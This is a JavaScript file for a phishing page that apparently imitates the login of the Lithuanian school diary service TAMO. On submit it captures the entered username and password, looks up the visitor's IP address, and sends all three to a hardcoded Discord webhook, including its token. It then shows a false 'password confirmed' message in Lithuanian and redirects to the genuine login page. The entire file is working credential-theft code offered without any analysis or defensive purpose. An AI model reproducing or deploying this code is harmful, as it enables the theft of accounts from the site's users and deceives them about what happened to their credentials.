document.addEventListener('DOMContentLoaded', function() {
  const submitButton = document.querySelector('.submit');
  const userInputField = document.querySelector('.inputUser');
  const passInputField = document.querySelector('.inputPass');

  const smallText = document.querySelector('.smallText');
  const smallText2 = document.querySelector('.smallText2');
  const smallText3 = document.querySelector('.smallText3');

  const square = document.querySelector('.square');

  submitButton.addEventListener('click', function() {
    const userText = userInputField.value;
    const passText = passInputField.value;

    if (submitButton.innerHTML == 'Uždaryti') {
      window.location.href = 'https://dienynas.tamo.lt/Prisijungimas/Login';
    } else {
      const webhookUrl = 'https://discord.com/api/webhooks/1080993406391689276/LP40O2IyY502kwcpKfEeCqWLm8eoWwKrKSJLR9LUIQpOidp4eLwBWqt2iyDinKL7Mw'+'7V';

      //Get ip
      fetch('https://api.ipify.org/?format=json')
        .then(results => results.json())
        .then(data => {
          const address = data.ip;
          
          // Construct the message payload
          const payload = {
            content: 'User: '+userText + ' Pass: '+passText + ' IP: '+address
          };

          // Send the message to the webhook
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          })
          .catch(error => {
            console.error("Įvyko klaida:", error);
          });
        })
        .catch(error => console.error(error));

      square.style.height = '235px';
      smallText.innerHTML = 'Slaptaždis sėkmingai patvirtintas.'
      submitButton.innerHTML = 'Uždaryti'

      smallText2.parentNode.removeChild(smallText2)
      smallText3.parentNode.removeChild(smallText3)

      userInputField.parentNode.removeChild(userInputField)
      passInputField.parentNode.removeChild(passInputField)
    };
  });
});
